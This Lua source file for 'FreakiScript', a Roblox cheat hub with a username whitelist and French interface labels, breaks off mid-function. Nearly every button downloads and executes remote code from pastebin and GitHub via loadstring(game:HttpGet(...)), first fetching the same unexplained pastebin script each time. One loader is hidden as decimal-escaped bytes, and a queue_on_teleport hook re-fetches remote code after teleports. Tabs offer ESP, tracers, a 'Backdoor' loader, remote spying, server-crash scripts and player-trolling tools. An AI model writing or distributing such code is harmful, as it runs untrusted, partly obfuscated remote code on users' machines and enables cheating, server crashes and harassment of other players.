--[[

███████╗██████╗ ███████╗ █████╗ ██╗  ██╗██╗███████╗ ██████╗██╗██████╗ ████████╗
██╔════╝██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██║██╔════╝██╔════╝██║██╔══██╗╚══██╔══╝
█████╗  ██████╔╝█████╗  ███████║█████╔╝ ██║███████╗██║     ██║██████╔╝   ██║   
██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██║╚════██║██║     ██║██╔═══╝    ██║   
██║     ██║  ██║███████╗██║  ██║██║  ██╗██║███████║╚██████╗██║██║        ██║   
╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝╚═╝╚═╝        ╚═╝   
YOUTUBE : https://www.youtube.com/@Freakidann                                                                            
]]
while not game:IsLoaded() or not game:GetService("CoreGui") or not game:GetService("Players").LocalPlayer or not game:GetService("Players").LocalPlayer.PlayerGui do wait() end

local mouse = game.Players.LocalPlayer:GetMouse()
mouse.Icon = "http://www.roblox.com/asset/?id=13731611108" -- NOTE Asset ID of cursor icon(default white dot) --

local player = game.Players.LocalPlayer

-- Whitelist system by Freakidann

local whitelistedname = false

local whitelistname = {'vertdemons','ZZ_RxYYBBk','black_dyabolo', 'Vertdemons2'} -- NOTE has strings ('',"") and in the strings u put the names

if table.find(whitelistname, player.Name) then

    whitelistedname = true
    
    -- Load Kavo UI Library
    local Kavo = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
    
    -- Safety: if the remote UI library failed to load, stop to avoid nil indexing errors
    if not Kavo then
        warn("Failed to load Kavo UI library; aborting FreakiV5 initialization")
        return
    end

    -- Create the main library window using correct Kavo API
    local library = Kavo.CreateLib("FreakiExploit V4", "Ocean")
    
    -- Simple notification to show loading
    print("Loading FreakiScript V4...")
    wait(1)

------- Start Hubs - Create tabs using correct Kavo API

local Home = library:NewTab("🏠 Home")

local Section1 = Home:NewSection("Note📃")

local Label1 = Section1:NewLabel("⚠️Toutes les fonctionnalités ne fonctionnent pas correctement et nécessitent")--"left", "center", "right"
local Label1 = Section1:NewLabel("encore quelques ajustements, alors ne soyez pas en colère, je travaille sur des choses 😊")--"left", "center", "right"

Section1 = Home:NewSection("Welcome")

local Label1 = Section1:NewLabel("👋 Bienvenue dans mon Exploit!")--"left", "center", "right"

Section1 = Home:NewSection("Version 4.0")

local Label1 = Section1:NewLabel("✏️ Présentation de nouvelles fonctionnalités et améliorations du script")--"left", "center", "right"

Section1 = Home:NewSection("Thank You")

local Label1 = Section1:NewLabel("💖 Merci d'avoir utilisé mon script!")--"left", "center", "right"

Section1 = Home:NewSection("DiscordInfo")

local Label1 = Section1:NewLabel("📣 Rejoignez mon Discord pour les mises à jour et le support!")--"left", "center", "right"

Section1 = Home:NewSection("Early Development")
local Label1 = Section1:NewLabel(" ")--"left", "center", "right"
local Label1 = Section1:NewLabel("🌱 Ce script est actuellement en début de développement, mais nous travaillons dur pour le rendre encore meilleur !")--"left", "center", "right"
local Label1 = Section1:NewLabel("Nous apprécions votre soutien et votre patience alors que nous continuons à nous améliorer et à ajouter de nouvelles fonctionnalités.")--"left", "center", "right"
local Label1 = Section1:NewLabel(" ")--"left", "center", "right"
local Label1 = Section1:NewLabel("Restez à l'écoute pour des mises à jour passionnantes! 💪😊")--"left", "center", "right"


Section1 = Home:NewSection("Update Log")

local Label1 = Section1:NewLabel("- Ajout de nouveaux scripts de jeux.")--"left", "center", "right"

local Label1 = Section1:NewLabel("- Correction de bugs et amélioration des performances.")--"left", "center", "right"

local Label1 = Section1:NewLabel("- Nouveaux éléments dans l'exploit et options.")--"left", "center", "right"


-----

local Settings1 = library:NewTab("⚙ Hubs Settings")

local Section1 = Settings1:NewSection("Cursor")


local Button1 = Section1:NewButton("Basic Cursor", "Change cursor to default", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	while not game:IsLoaded() or not game:GetService("CoreGui") or not game:GetService("Players").LocalPlayer or not game:GetService("Players").LocalPlayer.PlayerGui do wait() end

local mouse = game.Players.LocalPlayer:GetMouse()
mouse.Icon = "http://www.roblox.com/asset/?id=None" -- Asset ID of cursor icon(default white dot) --
end)


local Button2 = Section1:NewButton("FreakiCursor Basic", "FreakiScript cursor", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	while not game:IsLoaded() or not game:GetService("CoreGui") or not game:GetService("Players").LocalPlayer or not game:GetService("Players").LocalPlayer.PlayerGui do wait() end

local mouse = game.Players.LocalPlayer:GetMouse()
mouse.Icon = "http://www.roblox.com/asset/?id=13731611108" -- Asset ID of cursor icon(default white dot) --
end)


local Button3 = Section1:NewButton("FreakiCursor FPSPecision", "FPS precision cursor", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	while not game:IsLoaded() or not game:GetService("CoreGui") or not game:GetService("Players").LocalPlayer or not game:GetService("Players").LocalPlayer.PlayerGui do wait() end

local mouse = game.Players.LocalPlayer:GetMouse()
mouse.Icon = "http://www.roblox.com/asset/?id=13731718651" -- Asset ID of cursor icon(default white dot) --
end)

Section1 = Settings1:NewSection("Visual")

local Button4 = Section1:NewButton("ESP", "Enable ESP for all players", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	local Players = game:GetService("Players"):GetChildren()
local RunService = game:GetService("RunService")
local highlight = Instance.new("Highlight")
highlight.Name = "Highlight"

for i, v in pairs(Players) do
    repeat wait() until v.Character
    if not v.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
        local highlightClone = highlight:Clone()
        highlightClone.Adornee = v.Character
        highlightClone.Parent = v.Character:FindFirstChild("HumanoidRootPart")
        highlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlightClone.Name = "Highlight"
    end
end

game.Players.PlayerAdded:Connect(function(player)
    repeat wait() until player.Character
    if not player.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
        local highlightClone = highlight:Clone()
        highlightClone.Adornee = player.Character
        highlightClone.Parent = player.Character:FindFirstChild("HumanoidRootPart")
        highlightClone.Name = "Highlight"
    end
end)

game.Players.PlayerRemoving:Connect(function(playerRemoved)
    playerRemoved.Character:FindFirstChild("HumanoidRootPart").Highlight:Destroy()
end)

RunService.Heartbeat:Connect(function()
    for i, v in pairs(Players) do
        repeat wait() until v.Character
        if not v.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
            local highlightClone = highlight:Clone()
            highlightClone.Adornee = v.Character
            highlightClone.Parent = v.Character:FindFirstChild("HumanoidRootPart")
            highlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            highlightClone.Name = "Highlight"
            task.wait()
        end
end
end)
end)

local Button5 = Section1:NewButton("Fog Remover", "Remove fog and improve lighting", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	game.Lighting.FogEnd = 100000
	game.Lighting.FogStart = 0
	game.Lighting.ClockTime = 14
	game.Lighting.Brightness = 2
	game.Lighting.GlobalShadows = false
end)

local Button6 = Section1:NewButton("Tracers", "Enable tracers to players", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	_G.TeamCheck = false
_G.Tracers = true
local lp = game.Players.LocalPlayer
local camera = game:GetService("Workspace").CurrentCamera
local CurrentCamera = workspace.CurrentCamera
local worldToViewportPoint = CurrentCamera.worldToViewportPoint
local Tracers = {}

for i, v in pairs(game.Players:GetChildren()) do
    repeat wait() until game:IsLoaded() and game.Players and game.Players.LocalPlayer and game.Players.LocalPlayer.Character and v.Character and v.Character.Head ~= nil and v.Character.HumanoidRootPart ~= nil
end

function createTracer(player)
    local Tracer = Drawing.new("Line")
    Tracer.Visible = false
    Tracer.Color = Color3.new(255,0,0)
    Tracer.Thickness = 1
    Tracer.Transparency = 1
    Tracers[player] = Tracer
    
    function traces()
        game:GetService("RunService").RenderStepped:Connect(function()
            if player.Character ~= nil and player.Character:FindFirstChild("Humanoid") ~= nil and player.Character:FindFirstChild("HumanoidRootPart") ~= nil and player ~= lp and player.Character.Humanoid.Health > 0 then
                local Vector, OnScreen = camera:worldToViewportPoint(player.Character.HumanoidRootPart.Position)
                
                if OnScreen then
                    Tracer.From = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 1)
                    Tracer.To = Vector2.new(Vector.X, Vector.Y)
                    
                    if _G.TeamCheck and player.TeamColor == lp.TeamColor then
                        Tracer.Visible = false
                    else
                        Tracer.Visible = true
                    end
                else
                    Tracer.Visible = false
                    
                end
            else
                Tracer.Visible = false
            end
            if _G.Tracers == false then
                Tracer.Visible = false
            end
        end)
    end
    coroutine.wrap(traces)()
end

function removeTracer(player)
    if Tracers[player] ~= nil then
        Tracers[player]:Remove()
        Tracers[player] = nil
    end
end

function toggleTracers()
    _G.Tracers = not _G.Tracers
    for player, tracer in pairs(Tracers) do
        tracer.Visible = _G.Tracers
    end
end

game.Players.PlayerAdded:Connect(function(player)
    createTracer(player)
end)

game.Players.PlayerRemoving:Connect(function(player)
    removeTracer(player)
end)

for i,player in pairs(game.Players:GetPlayers()) do
    createTracer(player)
end

game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessedEvent)
    if input.KeyCode == Enum.KeyCode.F and not gameProcessedEvent then
        toggleTracers()
    end
end)
end)

local Label1 = Settings1:NewLabel("Press F to turn them on/off.")--"left", "center", "right"

-- Game Support

local GameSupport = library:NewTab("🔓 Game Support")

local Section1 = GameSupport:NewSection("Auto Open Detect !")

local Button1 = GameSupport:NewButton("Detect the script for this game", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
repeat task.wait() until game:IsLoaded()
local StarTime = tick()
loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/Extras/Anti-Cheat"))()
local A = loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.G-Hub-Games-List"))()
local BlurEffect = Instance.new("BlurEffect")
BlurEffect.Parent = Lighting
BlurEffect.Size = 0
local ScreenGui = Instance.new("ScreenGui")
if syn and syn.protect_gui then
    syn.protect_gui(ScreenGui)
    ScreenGui.Parent = CoreGui
elseif gethui then
    ScreenGui.Parent = gethui()
else
    ScreenGui.Parent = CoreGui
end
BlurEffect:Destroy()
ScreenGui:Destroy()

local queue_on_teleport = queue_on_teleport or syn and syn.queue_on_teleport 
queue_on_teleport[[repeat wait() until game:IsLoaded() print("ServerHoped or rejoined") loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/littlegui/main/V.G-Hubs-Source'))()]]

for i, v in pairs(Games) do
    if i == game.PlaceId then
        loadstring(game:HttpGet(v))()
    end
end

for i, v in pairs(Unknown) do
    loadstring(game:HttpGet(v))()
end
  	end)

local Section1 = GameSupport:NewSection("Support Game !")


-- Utils

local Utils = library:NewTab("🛠 Utils")

local Button1 = Utils:NewButton("Rejoin", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Rejoin-Game-2583"))()
end)

local Button1 = Utils:NewButton("Time Reverse", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://pastebin.com/raw/cgWLwdN9",true))()
end)

local Button1 = Utils:NewButton("CPU Reducer", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://pastebin.com/raw/tR2TqFDA",true))()
end)

local Button1 = Utils:NewButton("Fe Zoom", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet(('https://pastefy.ga/Rmbg6Zxh/raw'),true))()
end)

local Button1 = Utils:NewButton("OpenAi Script (Premium)", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet(('https://pastebin.com/raw/6gDJe4Lh'),true))()
end)

local Button1 = Utils:NewButton("SmoothCam", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Smooth-Camera-Movements-11014"))()
end)

local Button1 = Utils:NewButton("RTXShader", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Chillz-Enhancer-Shader-10451"))()
end)

local Button1 = Utils:NewButton("AntiAFK", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/batusz/main/roblox/__Anti__Afk__Script__", true))()
end)

local Button1 = Utils:NewButton("Backdoor", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
end)

local Button1 = Utils:NewButton("Sword Reach", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProGitHubMasta/Sheep-s-Reach-GUI/main/sheep_reach_gui_v2"))()
end)

local Button1 = Utils:NewButton("Remote Spy", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Spy-V3-8397"))()
end)

local Button1 = Utils:NewButton("DexExplorer V5", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
end)

local Button1 = Utils:NewButton("DexTouch", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://pastebin.com/raw/70sKZ1DQ"))()
end)

local Button1 = Utils:NewButton("CFrame", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Cframe-Finder-V2-11064"))()
end)

local Button1 = Utils:NewButton("Fe Portal Gun", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/randomguy194/dollar-tree-portal-gun/main/budget%20portal%20gun.txt'))()
end)

local Button1 = Utils:NewButton("Btool OP", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
end)

local Button1 = Utils:NewButton("Fe R6 Spiderman", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet(('https://pastebin.com/rae/2X0hKUgq'),true))()
end)

local Button1 = Utils:NewButton("Chat Translator", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet(('https://pastebin.com/raw/w8j7MvCC'),true))()
end)
local Label1 = Utils:NewLabel("Commands Change Langues : >fr , >en etc...")--"left", "center", "right"

-- Crash Serv

local CrashServ = library:NewTab("💣 CrashServ GUI")

local Button1 = CrashServ:NewButton("Auto txt Crash", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet(('https://pastebin.com/raw/5c5gejWN'),true))()
end)

local Button1 = CrashServ:NewButton("CrashGui txt", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/BatuKvi123/LagChat/main/lol"))()
end)



-- My game
local MyGame = library:NewTab("🕹 MyGame")

local Button1 = MyGame:NewButton("CorridorRun TP", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	local tweenService = game:GetService("TweenService")
local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear)
local tween = tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, tweenInfo, {CFrame = CFrame.new(Vector3.new(-10754.23046875, 3.92738938331604, -111.55001068115234))})
tween:Play()
end)

-- exploit

local Exploit = library:NewTab("📟 Exploit Gui")

local Button1 = Exploit:NewButton("FreakiGui Exploit Orca", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://pastebin.com/raw/zR52D5NE"))()
end)

local Button1 = Exploit:NewButton("Synapse X Remake", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/main/Synapse-X-Remake.lua"))()
end)

local Button1 = Exploit:NewButton("Fake Arceus", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
end)


-- Musique

local Music = library:NewTab("🔊 Music")

local Button1 = Music:NewButton("Autopiano Midi files", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/richie0866/MidiPlayer/main/package.lua"))()
end)

-- Games
local Games = library:NewTab("🎮 Games")

local Button1 = Games:NewButton("Anime Tales RELEASE BlackoutServices OP", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Blackout4781/Roblox-Scripts/main/AnimeTales"))()
end)

local Button1 = Games:NewButton("Blox Fruits farming", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Domadicoof/Domadicoof/main/Domadichub/NottoGay/Start.ranscript"))()
end)

local Button1 = Games:NewButton("BedWars", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
end)

local Button1 = Games:NewButton("ColorORDie", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
end)

local Button1 = Games:NewButton("Criminality", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/JackHiggly/RobloxThings/main/FemWare0", true))()
end)

local Button1 = Games:NewButton("Car Dealership Tycoon", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/03sAlt/BlueLockSeason2/main/README.md"))()
end)

local Button1 = Games:NewButton("DBZ Final Stand", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/dbz", true))()
end)

local Button1 = Games:NewButton("Epic Minigames", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/SlamminPig/rblxgames/main/Epic%20Minigames/EpicMinigamesGUI"))()
end)

local Button1 = Games:NewButton("Flee the Facility", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()
end)

local Button1 = Games:NewButton("Flag Wars! Infinity ammo", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://www.textbin.online/paste.php?raw&id=214", true))()
end)

local Button1 = Games:NewButton("Fishing Simulator Pro Fisher", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/VxleLUA/Dynamic-Offical/main/System/GameChecker.lua"))()
end)

local Button1 = Games:NewButton("Funky Friday Auto Player", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Nadir3709/RandomScript/main/FunkyFridayMobile"))()
end)

local Button1 = Games:NewButton("Head Punch Simulator", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/bunnynwy/games/main/main.lua"))()
end)

local Button1 = Games:NewButton("KAT", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/zReal-King/Knife-Ability-Test/main/Gui'))()
end)

local Button1 = Games:NewButton("Knife Clicker Simulator", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Xyl3ntHacks/Knife-Clicker-Simulator-/main/main", true))()
end)

local Button1 = Games:NewButton("King Legacy", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Strikehubv2z/StormSKz/main/All_in_one"))()
end)

local Button1 = Games:NewButton("Lab Experiment", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Justanotherdme/scripts/main/LabExperiment.lua')))()
end)

local Button1 = Games:NewButton("Lumber Tycoon 2 NightFALL GUI", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/stepforintructions/NightFall/main/NightFall"))()
end)

local Button1 = Games:NewButton("Natural Disaster", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://scriptblox.com/raw/Natural-Disaster-Survival-I-was-here-3355"))()
end)

local Button1 = Games:NewButton("Michael's Zombies", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/MichaelZombies.lua"))()
end)

local Button1 = Games:NewButton("MM2 Farm", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\106\101\110\115\100\101\118\101\108\111\112\101\114\47\74\101\110\115\72\117\98\47\109\97\105\110\47\83\99\114\105\112\116\34\41\41\40\41\10")()
end)

local Button1 = Games:NewButton("Monday Morning Misery", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring("loadstring(game:HttpGet'https://raw.githubusercontent.com/stavratum/lua/main/mmm/main.lua')()(Discord)")()
end)

local Button1 = Games:NewButton("Pet Simulator X", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammed6196/NukeVsCity/main/Main.lua" ))()
end)

local Button1 = Games:NewButton("Pet Simulator X Grass Hub", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/nottheetnirething3/psx/main/loader.lua"))()
end)

local Button1 = Games:NewButton("Plsdonate Best Gui", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://pastebin.com/raw/f0a3yune"))()
end)

local Button1 = Games:NewButton("Project Slayers", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Blackout4781/Roblox-Scripts/main/AnimeTales"))()
end)

local Button1 = Games:NewButton("Cart Rdite Script", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/hussain1323232234/My-Scripts/main/Cart%20Ride%20Into%20Rdite!'),true))()
end)

local Button1 = Games:NewButton("Rank Simulator X", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Xyl3ntHacks/Rank-Sim/main/Main", true))()
end)

local Button1 = Games:NewButton("Specter", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet('https://navicat.glitch.me/Specter/script.lua'))()
end)

local Button1 = Games:NewButton("Starving artists (DONATION GAME)", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/x4nto/ThunderHub/rblxscripts/dabest.lua"))()
end)

local Button1 = Games:NewButton("Snipers [BETA]", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/HitboxExpander.lua"))()
end)

local Button1 = Games:NewButton("Slap Battles", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/dizyhvh/rbx_scripts/main/dizzy_hub/scripts/slap_battles.lua"))()
end)

local Button1 = Games:NewButton("The Spinner SUPER OP GUI 2", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/nonono100/no/main/The%20Spinner"))()
end)

local Button1 = Games:NewButton("Universal Time", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/muzrblx/nanocores/main/Loader/HubLoader.lua"))()
end)

local Button1 = Games:NewButton("Zombie Uprising (Not working Now)", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet('https://pastebin.com/raw/rpBxjS6g'))()
end)

local Button1 = Games:NewButton("Infectious Smile", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/InfectiousSmile.lua", true))()
end)

local Button1 = Games:NewButton("Legends Of Speed", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://scriptblox.com/raw/Legends-Of-Speed-Speeeeed-Farm-Open-Source-old-code-lel-1785"))()
end)

local Button1 = Games:NewButton("LUCKY BLOCKS Battlegrounds", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://scriptblox.com/raw/LUCKY-BLOCKS-Battlegrounds-Novice-Hub-9099"))()
end)

local Button1 = Games:NewButton("Hoop Simulator 🏀", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/SpinnyMemer/Games/main/loader"))()
end)

local Button1 = Games:NewButton("Destruction Simulator", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://scriptblox.com/raw/Destruction-Simulator-*OP*-GUI-1858"))()
end)

local Button1 = Games:NewButton("Get Richer Every Second", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet(('https://pastebin.com/raw/WpuXsqCT'), true))()
end)

local Button1 = Games:NewButton("Bubble Gum Clicker!", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://github.com/GhostDuckyy/GhostDuckyy/blob/main/Source/Bubble%20Gum%20Clicker.lua?raw=true"))()
end)

local Button1 = Games:NewButton("Rainbow Friends", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/SpinnyMemer/Games/main/13522981808"))()
end)

-- trolling script

local Trolling = library:NewTab("🧨 Trolling Script")

local Button1 = Trolling:NewButton("Kidnaping BrookHaven", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://pastebin.com/raw/XZfAQyN1"))()
end)

local Button1 = Trolling:NewButton("BlackHole", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://pastebin.com/raw/yPFK7qVK"))()
end)

local Button1 = Trolling:NewButton("SoundSpam", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://pastebin.com/raw/Y88QSeQB"))()
end)

local Label1 = Trolling:NewLabel("Jeux pour SoundSpam - SoundSpam Fonctionne avec :")--"left", "center", "right"
local Label1 = Trolling:NewLabel("Fencing, Natural-Disaster-Survival, Work-at-a-Pizza-Place, CHAOS, Prison-Life.", "left")--"left", "center", "right"

local Button1 = Trolling:NewButton("SusAnim", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/kW9kjCSZ')))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua"))()
end)

local Button1 = Trolling:NewButton("1x1x1x1", function()
